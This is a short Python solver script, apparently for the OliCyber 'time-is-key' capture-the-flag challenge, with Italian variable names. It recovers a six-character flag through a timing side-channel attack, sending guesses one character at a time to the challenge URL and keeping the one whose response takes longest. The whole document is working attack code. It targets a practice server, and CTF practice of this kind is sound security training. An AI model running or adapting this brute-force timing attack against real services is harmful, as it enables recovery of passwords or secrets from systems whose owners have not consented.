import requests
import time
import string

URL = "http://time-is-key.challs.olicyber.it/" 
possibile = string.ascii_lowercase + string.digits

flag = ""

for i in range(6):
    charMigliore = None
    tempoMigliore = 0

    for c in possibile:
        guess = flag + c + "A" * (6 - len(flag) - 1)
        
        start = time.time()
        requests.post(URL, data={"flag": guess})
        elapsed = time.time() - start

        print(i, c, elapsed)   # debug

        if elapsed > tempoMigliore:
            tempoMigliore = elapsed
            charMigliore = c

    flag += charMigliore
    print("Trovato:", charMigliore)

print("\nFLAG =", flag)
